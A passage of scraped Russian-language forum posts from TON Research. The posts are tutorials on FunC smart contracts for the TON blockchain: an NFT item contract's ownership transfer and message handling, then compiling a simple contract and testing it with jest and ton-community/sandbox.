Функция `force_chain` проверяет, что адрес находится в воркчейне с номером 0 (базовый ворчейн). Подробнее про адреса и номера можно почитать [здесь](https://github.com/ton-blockchain/ton/blob/master/doc/LiteClient-HOWTO) в самом начале. Разберем код из params.fc:

```
int workchain() asm "0 PUSHINT";

() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

Вспомогательную функцию `workchain()` определим как низкоуровневый примитив TVM, с помощью ключевого слова `asm`. Integer == 0 понадобиться нам для сравнения.

```
int workchain() asm "0 PUSHINT";
```

Для извлечения необходимой нам информации из адреса, используется `parse_std_addr()`. `parse_std_addr()` - возвращает из `MsgAddressInt` воркчейн и 256-битный integer адрес.

```
() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

А для вызова исключения, если воркчейны не равны будем использовать `throw_unless()`.

Возвращаемся обратно в нашу функцию nft-item.fc. Достаем адрес нового владельца, проверяем воркчейн функцией force\_chain(), а также достаем адрес куда отправить нотификацию, что произошла смена владельца.

```
slice new_owner_address = in_msg_body~load_msg_addr();
force_chain(new_owner_address);
slice response_destination = in_msg_body~load_msg_addr();
```

Так как пример не предполагает использование пользовательской полезной нагрузки, пропускаем ее и достаем из тела `forward_amount` количество наноТон, которое будет отправлено новому владельцу. Теперь функция выглядит так:

```
() transfer_ownership(int my_balance, int index, slice collection_address, slice owner_address, cell content, slice sender_address, int query_id, slice in_msg_body, int fwd_fees) impure inline {
	throw_unless(401, equal_slices(sender_address, owner_address));

	slice new_owner_address = in_msg_body~load_msg_addr();
	force_chain(new_owner_address);
	slice response_destination = in_msg_body~load_msg_addr();
	in_msg_body~load_int(1); ;; this nft don't use custom_payload
	int forward_amount = in_msg_body~load_coins();
}
```

Далее идет вычисление значения Ton, которое нужно будет отправить обратно на адрес для нотификации об изменении владельца. Останавливаться здесь не будет, чтобы не затягивать урок, а чтобы проще понять код, которые будет ниже советую ознакомиться с [Transaction fees](https://docs.ton.org/develop/smart-contracts/fees). Также отмечу, что мы учитываем при расчете, что адрес может быть `addr_none`.

```
int rest_amount = my_balance - min_tons_for_storage();
if (forward_amount) {
  rest_amount -= (forward_amount + fwd_fees);
}
int need_response = response_destination.preload_uint(2) != 0; ;; if NOT addr_none: 00
if (need_response) {
  rest_amount -= fwd_fees;
}
```

Если оставшееся значение меньше нуля выдадим исключение:

throw\_unless(402, rest\_amount >= 0); ;; base nft spends fixed amount of gas, will not check for response

Теперь отправляем новому владельцу нотификацию:

```
	if (forward_amount) {
	  send_msg(new_owner_address, forward_amount, op::ownership_assigned(), query_id, begin_cell().store_slice(owner_address).store_slice(in_msg_body), 1);  ;; paying fees, revert on errors
	}
```

Проверив воркчейн, отправим нотификацию и на адрес, который был указан для нотификации.

```
	if (need_response) {
	  force_chain(response_destination);
	  send_msg(response_destination, rest_amount, op::excesses(), query_id, null(), 1); ;; paying fees, revert on errors
	}
```

Ну и конечно сохраняем изменения в регистре `c4`. Итог:

```
() transfer_ownership(int my_balance, int index, slice collection_address, slice owner_address, cell content, slice sender_address, int query_id, slice in_msg_body, int fwd_fees) impure inline {
	throw_unless(401, equal_slices(sender_address, owner_address));

	slice new_owner_address = in_msg_body~load_msg_addr();
	force_chain(new_owner_address);
	slice response_destination = in_msg_body~load_msg_addr();
	in_msg_body~load_int(1); ;; this nft don't use custom_payload
	int forward_amount = in_msg_body~load_coins();

	int rest_amount = my_balance - min_tons_for_storage();
	if (forward_amount) {
	  rest_amount -= (forward_amount + fwd_fees);
	}
	int need_response = response_destination.preload_uint(2) != 0; ;; if NOT addr_none: 00
	if (need_response) {
	  rest_amount -= fwd_fees;
	}

	throw_unless(402, rest_amount >= 0); ;; base nft spends fixed amount of gas, will not check for response

	if (forward_amount) {
	  send_msg(new_owner_address, forward_amount, op::ownership_assigned(), query_id, begin_cell().store_slice(owner_address).store_slice(in_msg_body), 1);  ;; paying fees, revert on errors
	}
	if (need_response) {
	  force_chain(response_destination);
	  send_msg(response_destination, rest_amount, op::excesses(), query_id, null(), 1); ;; paying fees, revert on errors
	}

	store_data(index, collection_address, new_owner_address, content);
}
```

##### [](#h-26)Аргументы внешнего метода

Так же как и в прошлый раз.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#h-27)Берем данные из тела сообщения

Итак первое, что мы сделаем в `recv_internal()` это проверим пустое ли сообщение:

```
if (in_msg_body.slice_empty?()) { ;; ignore empty messages
    return ();
}
```

Дальше мы начинаем разбирать(вычитывать) сообщение:

```
slice cs = in_msg_full.begin_parse();
```

Достаем флаги и проверяем что сообщение не было возвращенным (здесь имеется ввиду bounced).

```
int flags = cs~load_uint(4);
if (flags & 1) { ;; ignore all bounced messages
    return ();
}
```

Теперь пропускаем значения, которые нам не нужны, что за значения можно посмотреть [здесь](https://docs.ton.org/develop/smart-contracts/messages#message-layout).

```
cs~load_msg_addr(); ;; skip dst
cs~load_coins(); ;; skip value
cs~skip_bits(1); ;; skip extracurrency collection
cs~load_coins(); ;; skip ihr_fee
```

Также достаем `fwd_fee`, который позже будем использовать для расчета, сколько Ton отправить обратно, после всех манипуляций.

Теперь достаем данные из регистра `c4`, включая `init` , то самое значение 0 и -1, в зависимости от того полностью ли инициализирован NFT и готов к взаимодействию.

Если NFT не готов, проверим что отправивший сообщение владелец коллекции и проинициализируем эту NFT

```
(int init?, int index, slice collection_address, slice owner_address, cell content) = load_data();
if (~ init?) {
  throw_unless(405, equal_slices(collection_address, sender_address));
  store_data(index, collection_address, in_msg_body~load_msg_addr(), in_msg_body~load_ref());
  return ();
}
```

Дальше достаем `op` и `query_id` для построения логики с использованием условных операторов:

```
int op = in_msg_body~load_uint(32);
int query_id = in_msg_body~load_uint(64);
```

Первое `op` это передача права собственности, технически все просто: вызываем функцию `transfer_ownership()` , которую мы объявили ранее и заканчиваем выполнение.

```
if (op == op::transfer()) {
  transfer_ownership(my_balance, index, collection_address, owner_address, content, sender_address, query_id, in_msg_body, fwd_fee);
  return ();
}
```

Второе `op` это получение статических данных, соответственно просто отправляем сообщение с данными:

```
if (op == op::get_static_data()) {
  send_msg(sender_address, 0, op::report_static_data(), query_id, begin_cell().store_uint(index, 256).store_slice(collection_address), 64);  ;; carry all the remaining value of the inbound message
  return ();
}
```

В конце идет исключение, т.е. если контракт не выполнит какое-то действие в соответствии с `op`, будет исключение. Итоговый код `recv_internal()`:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}

	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	cs~load_msg_addr(); ;; skip dst
	cs~load_coins(); ;; skip value
	cs~skip_bits(1); ;; skip extracurrency collection
	cs~load_coins(); ;; skip ihr_fee
	int fwd_fee = cs~load_coins(); ;; we use message fwd_fee for estimation of forward_payload costs


	(int init?, int index, slice collection_address, slice owner_address, cell content) = load_data();
	if (~ init?) {
	  throw_unless(405, equal_slices(collection_address, sender_address));
	  store_data(index, collection_address, in_msg_body~load_msg_addr(), in_msg_body~load_ref());
	  return ();
	}

	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	if (op == op::transfer()) {
	  transfer_ownership(my_balance, index, collection_address, owner_address, content, sender_address, query_id, in_msg_body, fwd_fee);
	  return ();
	}
	if (op == op::get_static_data()) {
	  send_msg(sender_address, 0, op::report_static_data(), query_id, begin_cell().store_uint(index, 256).store_slice(collection_address), 64);  ;; carry all the remaining value of the inbound message
	  return ();
	}
	throw(0xffff);
}
```

#### [](#get-get_nft_data-28)Get-метод get\_nft\_data()

У смарт-контракта отдельной NFT по [стандарту](https://github.com/ton-blockchain/TIPs/issues/62) должен быть один обязательный Get-метод.

Этот метод просто возвращает данные об этой отдельной NFT, а именно выгружает данные из `c4`:

```
(int, int, slice, slice, cell) get_nft_data() method_id {
  (int init?, int index, slice collection_address, slice owner_address, cell content) = load_data();
  return (init?, index, collection_address, owner_address, content);
}
```

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/10lesson/tenthlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/10lesson/tenthlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/10lesson/tenthlesson.md)

```
# Урок 10 Стандарт NFT

В 9 уроке мы разобрали, что есть деление токенов на невзаимозаменяемые и взаимозаменяемые, а также как выглядит стандарт взаимозаменяемых токенов, в этом уроке мы обсудим невзаимозаменяемые токены и разберем примеры по стандарту.

## Что такое стандарт NFT в TON

Итак, невзаимозаменяемые токены - это активы, каждый экземпляр которого уникален (специфичен) и не может быть замещён другим аналогичным активом. Невзаимозаменяемый токен представляет собой некоторый сертификат цифрового объекта с возможностью передавать сертификат через некоторый механизм.

[Стандарт NFT в TON](https://github.com/ton-blockchain/TIPs/issues/62) описывает:

-   Изменение формы собственности.
-   Способ объединения предметов в коллекции.
-   Способ дедупликации общей части коллекции.

> Дедупликация - метод исключения дублирующих копий, повторяющихся данных

Как и для Jetton, в стандарте NFT есть мастер-контракт - контракт коллекции и смарт-контракты для отдельной NFT в коллекции. В стандарте есть отличный пример: Если вы выпустите коллекцию, содержащую 10 000 элементов, то вы развернете 10 001 смарт-контракт, один контракт коллекции и 10000 контрактов для каждого элемента.

> В стандарте NFT также объясняется почему выбрана именно такая схема реализации NFT, с таким количеством контрактов, пункт - Rationale и следующий за ним.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/10lesson/tenthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 467

[TON Research](/)

# [Разбираемся в Pipeline работы со смарт-контрактами - Урок 1 Простой контракт в ton-community/sandbox](/t/pipeline-1-ton-community-sandbox/467)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:48pm  1

# [](#smart-contract-pipeline-part1-1)Smart Contract Pipeline Part1 - Пишем простой смарт-контракт и компилируем его

## [](#h-2)Вступление

Современным инструментом работы со смарт-контрактами в блокчейн TON является [blueprint](https://github.com/ton-org/blueprint/), он позволяет быстро создавать структуру проекта и сразу приступать к удобной разработке. Именно blueprint используется в моих уроках по языку разработки смарт-контрактов FunC.

Для успешной работы с blueprint нужно уметь работать с его различными компонентами, поэтому в этой серии туториалов мы разберем:

*   создание проекта, простого смарт-контракт и его компиляция с помощью [GitHub - ton-community/func-js: FunC compiler package](https://github.com/ton-community/func-js)
*   протестируем смарт-контракт используя [GitHub - ton-org/sandbox: Local TON emulator](https://github.com/ton-org/sandbox)
*   сделаем деплой в тестовую сеть удобным: генерация QR-кода, который мы будем подтверждать в кошельке
*   TON является акторной моделью - смарт-контракты общаются между собой сообщениям - напишем смарт-контракт чат-бот, который будет отвечать сообщением на сообщение)
*   протестируем смарт-контракт чат-бот и научимся тестировать смарт-контракты отправляющие сообщения

Начнем с создания простого смарт-контракта и его компиляции.

## [](#h-3)Инициализация проекта

Создайте папку для своего проекта и зайдите в нее.

```
// Windows example
mkdir test_folder
cd test_folder
```

В этом туториале мы будем использовать менеджер пакетов `yarn`.

```
	yarn init
```

Давайте инициализируем `yarn` и прокликаем вопросы консоли, так как это тестовый пример. После этого мы должны получить файл `package.json` в папке.

Теперь добавим typescript и необходимые библиотеки. Установите их как dev dependencies:

```
yarn add typescript ts-node @types/node @swc/core --dev
```

Создайте файл `tsconfig.json`. он нужен для конфигурации компиляции проекта. Добавим к нему:

```
{
	"compilerOptions": {
		"target" : "es2020",
		"module" : "commonjs",
		"esModuleInterop" : true,
		"forceConsistentCasingInFileNames": true,
		"strict" : true,
		"skipLibCheck" : true,
		"resolveJsonModule" : true

	},
	"ts-node": {
		"transpileOnly" : true,
		"transpile" : "ts-node/transpilers/swc"
	}
}
```

В этом туториале мы не будем останавливаться на том, что означает каждая строка конфигураций, потому что этот туториал посвящен смарт-контрактам. Теперь установим библиотеки, необходимые для работы с TON:

```
yarn add ton-core ton-crypto @ton-community/func-js  --dev
```

Теперь давайте создадим смарт-контракт на FunC. Создайте папку `contracts` и файл `main.fc` с минимальным кодом:

```
() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

} 
```

`recv_internal` вызывается, когда смарт-контракт получает входящее внутреннее сообщение. В стеке есть некоторые переменные, когда [TVM инициирует](https://docs.ton.org/learn/tvm-instructions/tvm-overview#initialization-of-tvm), задав аргументы в recv\_internal, мы даем смарт-контракт понимание кода о некоторых из них.

Теперь давайте напишем скрипт, который будет компилировать наш шаблон смарт-контракта. Создадим папку `scripts` и файл `compile.ts` в ней.

Чтобы мы могли использовать этот скрипт, нам нужно добавить его как параметр в менеджере пакетов, т.е. в файле `package.json`, он будет выглядеть так:

```
{
  "name": "test_folder",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "devDependencies": {
	"@swc/core": "^1.3.63",
	"@ton-community/func-js": "^0.6.2",
	"@types/node": "^20.3.1",
	"ton-core": "^0.49.1",
	"ton-crypto": "^3.2.0",
	"ts-node": "^10.9.1",
	"typescript": "^5.1.3"
  },
  "scripts": {
	  "compile" : "ts-node ./scripts/compile.ts"
  }
}
```

Теперь перейдем к написанию скрипта компиляции в файле `compile.ts`. Здесь оговоримся, что результатом компиляции будет представление [bag of Cell](https://docs.ton.org/develop/data-formats/cell-boc) в формате base64-кодированной строки . Этот результат нужно где-то сохранить, поэтому давайте создадим папку `build`.

Наконец мы добираемся до файла компиляции, первое, что мы делаем, это компилируем наш код с помощью функции `compileFunc`:

```
	import * as fs from "fs";
	import { readFileSync } from "fs";
	import process from "process";
	import { Cell } from "ton-core";
	import { compileFunc } from "@ton-community/func-js";

	async function compileScript() {

		const compileResult = await compileFunc({
			targets: ["./contracts/main.fc"], 
			sources: (path) => readFileSync(path).toString("utf8"),
		});

		if (compileResult.status ==="error") {
			console.log("Error happend");
			process.exit(1);
		}

	}
	compileScript();
```

Полученный hexBoС будет записан в папку:

```
import * as fs from "fs";
import { readFileSync } from "fs";
import process from "process";
import { Cell } from "ton-core";
import { compileFunc } from "@ton-community/func-js";

async function compileScript() {

	const compileResult = await compileFunc({
		targets: ["./contracts/main.fc"], 
		sources: (path) => readFileSync(path).toString("utf8"),
	});

	if (compileResult.status ==="error") {
		console.log("Error happend");
		process.exit(1);
	}

	const hexBoC = 'build/main.compiled.json';

	fs.writeFileSync(
		hexBoC,
		JSON.stringify({
			hex: Cell.fromBoc(Buffer.from(compileResult.codeBoc,"base64"))[0]
				.toBoc()
				.toString("hex"),
		})

	);

}

compileScript();
```

Для удобства можно разбавить код `console.log()`, чтобы было понятно, что сработало, а что нет при компиляции, например, можно добавить в конец:

```
console.log("Compiled, hexBoC:"+hexBoC);
```

Который выведет полученный hexBoC.

## [](#h-4)Перейдем к самому смарт-контракту

Для создания контрактов нам понадобится стандартная библиотека функций FunC. Создайте папку `imports` внутри папки `contracts` и добавьте туда [этот](https://github.com/ton-blockchain/ton/blob/master/crypto/smartcont/stdlib.fc) файл.

Теперь перейдите в файл `main.fc` и импортируйте библиотеку, теперь файл выглядит так:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

} 
```

Кратко пробежимся по контракту, подробные разборы и уроки по FunC есть [здесь](https://github.com/romanovichim/TonFunClessons_ru).

Смарт-контракт, который мы напишем, будет хранить адрес отправителя внутреннего сообщения, а также хранить номер один в смарт-контракте. Также будет реализован метод Get, который при вызове будет возвращать адрес последнего отправителя сообщения в контракт и единицу.

В нашу функцию приходит внутреннее сообщение, оттуда мы сначала получим служебные флаги, а потом адрес отправителя, который сохраним:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

} 
```

Сохраним адрес и единицу в контракте, т.е. запишем данные в регистр `c4`.

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

	set_data(begin_cell().store_slice(sender_address).store_uint(1,32).end_cell());
} 
```

Пришло время метода Get, метод вернет адрес и число, поэтому начнем с `(slice,int)`

```
(slice,int) get_sender() method_id {

}
```

В самом методе получаем данные из регистра и возвращаем их пользователю:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

	set_data(begin_cell().store_slice(sender_address).store_uint(1,32).end_cell());
} 

(slice,int) get_sender() method_id {
	slice ds = get_data().begin_parse();
	return (ds~load_msg_addr(),ds~load_uint(32));
}
```

Финальная версия:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

	set_data(begin_cell().store_slice(sender_address).store_uint(1,32).end_cell());
} 

(slice,int) get_sender() method_id {
	slice ds = get_data().begin_parse();
	return (ds~load_msg_addr(),ds~load_uint(32));
}
```

Запускаем компиляцию с помощью команды `yarn compile` и получаем файл c `main.compiled.json` в папке `build`:

```
{"hex":"b5ee9c72410104010035000114ff00f4a413f4bcf2c80b0102016203020015a1418bda89a1f481a63e610028d03031d0d30331fa403071c858cf16cb1fc9ed5474696b07"}
```

## [](#conclusion-5)Conclusion

Следующим шагом мы будем писать [тесты](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simpletest.md) к смарт-контракту, спасибо за внимание.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/pipeline/simplesmartcontract.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md)

```
# Smart Contract Pipeline Part1 - Пишем простой смарт-контракт и компилируем его

## Вступление

Современным инструментом работы со смарт-контрактами в блокчейн TON является [blueprint](https://github.com/ton-org/blueprint/), он позволяет быстро создавать структуру проекта и сразу приступать к удобной разработке. Именно blueprint используется в моих уроках по языку разработки смарт-контрактов FunC.

Для успешной работы с blueprint нужно уметь работать с его различными компонентами, поэтому в этой серии туториалов мы разберем:

- создание проекта, простого смарт-контракт и его компиляция с помощью https://github.com/ton-community/func-js 
- протестируем смарт-контракт используя https://github.com/ton-org/sandbox
- сделаем деплой в тестовую сеть удобным: генерация QR-кода, который мы будем подтверждать в кошельке
- TON является акторной моделью - смарт-контракты общаются между собой сообщениям - напишем смарт-контракт чат-бот, который будет отвечать сообщением на сообщение)
- протестируем смарт-контракт чат-бот и научимся тестировать смарт-контракты отправляющие сообщения

Начнем с создания простого смарт-контракта и его компиляции.

## Инициализация проекта

Создайте папку для своего проекта и зайдите в нее.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md)

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 468

[TON Research](/)

# [Разбираемся в Pipeline работы со смарт-контрактами - Урок 2 Пишем тесты в ton-community/sandbox](/t/pipeline-2-ton-community-sandbox/468)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:49pm  1

# [](#smart-contract-pipeline-part2-1)Smart Contract Pipeline Part2 - Тестирование смарт-контракта

## [](#h-2)Вступление

В [первой части](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/pipeline/simplesmartcontract.md) мы рассмотрели каркас проекта и написали простой смарт-контракт, пришло время тестов.

## [](#h-3)Начнем работать над тестами

Для тестов нам понадобится фреймворк для тестирования, в нашем случае это будет [jest](https://jestjs.io), также нам нужно эмулировать работу блокчейна, для этого мы будем использовать [ton-community/sandbox](https://github.com/ton-community/sandbox) . Устанавливаем:

```
yarn add @ton-community/sandbox jest ts-jest @types/jest ton --dev
```

Чтобы использовать jest framework, вам нужен файл конфигурации. Создадим файл jets.config.js и добавим туда:

```
	/** @type {import('ts-jest').JestConfigWithTsJest} */
	module.exports = {
	  preset: 'ts-jest',
	  testEnvironment: 'node',
	};
```

Создадим папку для тестов - папку `tests`. А внутри мы создадим файл `main.spec.ts`.  
Проверим, правильно ли мы все установили, запустив примитивный тест, добавим в файл `main.spec.ts` следующий код:

```
describe("test tests", () => {
	it("test of test", async() => {});
});
```

Запустите его с помощью команды `yarn jest`, вы должны увидеть, что тесты пройдены. Для удобства запуска тестов модернизируем файл `package.json`.

```
{
  "name": "third",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "devDependencies": {
	"@swc/core": "^1.3.59",
	"@ton-community/func-js": "^0.6.2",
	"@ton-community/sandbox": "^0.11.0",
	"@types/jest": "^29.5.1",
	"@types/node": "^20.2.1",
	"jest": "^29.5.0",
	"ton": "^13.5.0",
	"ton-core": "^0.49.1",
	"ton-crypto": "^3.2.0",
	"ts-jest": "^29.1.0",
	"ts-node": "^10.9.1",
	"typescript": "^5.0.4"
  },
  "scripts": {
	"compile": "ts-node ./scripts/compile.ts",
	"test": "yarn jest"
  }
}
```

Теперь импортируем скомпилированный контракт и `Cell` из `ton-core` в файл `main.spec.ts`, чтобы контракт можно было открыть:

```
import { Cell } from "ton-core";
import { hex } from "../build/main.compiled.json";

describe("test tests", () => {
	it("test of test", async() => {});
});
```

Получаем ячейку с кодом:

```
import { Cell } from "ton-core";
import { hex } from "../build/main.compiled.json";


describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];


	});
});
```

Перейдем к использованию `@ton-community/sandbox`. Первое, что нужно сделать, - это использовать локальную версию блокчейна.

```
import { Cell } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();
	});
});
```

Для удобства взаимодействия с контрактом используются обертки. Простейшая обертка описывает развертывание контракта (а именно какие исходные данные, а также его методы или взаимодействие с ними).

Создайте папку `wrappers` и создайте в ней обертку `MainContract.ts` и сразу импортируйте в нее тип контракта и `ton-core`:

```
import { Contract } from "ton-core";
```

Мы создаем класс нашего контракта, реализуя `Contract`:

```
import { Contract } from "ton-core";

export class MainContract implements Contract {

}
```

При создании объекта класса вызывается конструктор. Напишем его, а также импортируем необходимые типы — адрес и ячейка.

```
import { Address,Cell,Contract } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}
}
```

Чтобы понять, почему конструктор именно такой, советую начать с [здесь](https://docs.ton.org/develop/howto/step-by-step).

Самое важное, что нужно знать сейчас, это то, что «данные» — это данные, которые будут находиться в регистре c4 при инициализации контракта.

Для удобства данные для контракта возьмем из конфига, поэтому создадим для этого статический класс.

```
import { Address,beginCell,Cell,Contract, contractAddress } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}
}
```

Для того, чтобы развернуть смарт-контракт, вам нужен код смарт-контракта и его исходные данные, все это мы поместим в конфиг для удобства тестов и развертывания.

Возвращаемся к файлу main.spec.ts. Теперь у нас есть код и оболочка, давайте воспользуемся функцией `openContract` из `ton-community/sandbox`, чтобы открыть контракт с помощью конфигурации.

```
import { Cell, Address  } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);
	});
});
```

Конфиг пока пуст, вернемся к нему позже. Теперь импортируем `Адрес` из `ton-core`, он нам понадобится для тестов. Чтобы протестировать контракт, нам нужна сущность, которая позволит нам отправлять сообщения, в «песочнице» это «казначейство».

```
import { Cell, Address } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");
	});
});
```

Итак, для тестов нам нужно отправлять внутренние сообщения. Поэтому необходимо модифицировать нашу обертку. Давайте добавим `sendInternalMessage` в `MainContract.ts`.

```
import { Address,beginCell,Cell,Contract, contractAddress, ContractProvider, Sender, SendMode } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}

	async sendInternalMessage(
		provider: ContractProvider,
		sender: Sender,
		value: bigint,
	){
		await provider.internal(sender,{
		value,
			sendMode: SendMode.PAY_GAS_SEPARATELY,
			body: beginCell().endCell(),
		});
	}
}
```

Вернитесь к тестовому файлу `main.spec.ts` и используйте метод, который мы только что написали в обертке:

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));
	});
});
```

В обертке можно было увидеть, что значение TON, которое нужно отправить, имеет тип bigint, поэтому в самих тестах используется удобная функция `toNano`, которая переводит удобочитаемое число в `bigInt`. Чтобы проверить, правильно ли сработала отправка сообщения, нужно вызвать `getMethod`, так как в случае отправки сообщения сначала нужно поработать с оберткой. Добавьте его в `MainContract.ts`:

```
import { Address,beginCell,Cell,Contract, contractAddress, ContractProvider, Sender, SendMode } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}

	static createFromConfig(config: any, code: Cell, workchain = 0){
		const data = beginCell().endCell();
		const init = { code,data };
		const address = contractAddress(workchain, init);

		return new MainContract(address,init);
	}

	async sendInternalMessage(
		provider: ContractProvider,
		sender: Sender,
		value: bigint,
	){
		await provider.internal(sender,{
			value,
			sendMode: SendMode.PAY_GAS_SEPARATELY,
			body: beginCell().endCell(),
		});
	}

	async getData(provider: ContractProvider) {
		const { stack } = await provider.get("get_sender", []);
		return {
			recent_sender: stack.readAddress(),
			number: stack.readNumber(),
		};
	}
}
```

Наконец-то мы сделали все подготовительные шаги к тестам и теперь можем их делать, для удобства установим `test-utils`. Эта библиотека позволит нам использовать кастомные совпадения для нашей тестовой среды Jest.

```
yarn add @ton-community/test-utils
```

Импортируем утилиты в файл с тестами и так же передаем в переменную результат отправки сообщения.

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));
	});
});
```

Здесь мы добавим первый тест, мы проверим, что транзакция с нашим сообщением прошла.

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();

		const myContract = blockchain.openContract(
			await MainContract.createFromConfig({}, codeCell)
		);

		const senderWallet = await blockchain.treasury("sender");

		const sentMessageResult = await myContract.sendInternalMessage(senderWallet.getSender(),toNano("0.05"));

		expect(sentMessageResult.transactions).toHaveTransaction({
			from: senderWallet.address,
			to: myContract.address,
			success: true,
		});

	});
});
```

Далее мы вызываем метод get и проверяем, что возвращается правильный адрес в соответствии с логикой контракта.

```
import { Cell, Address, toNano } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";
import { MainContract } from "../wrappers/MainContract";
import { send } from "process";
import "@ton-community/test-utils";

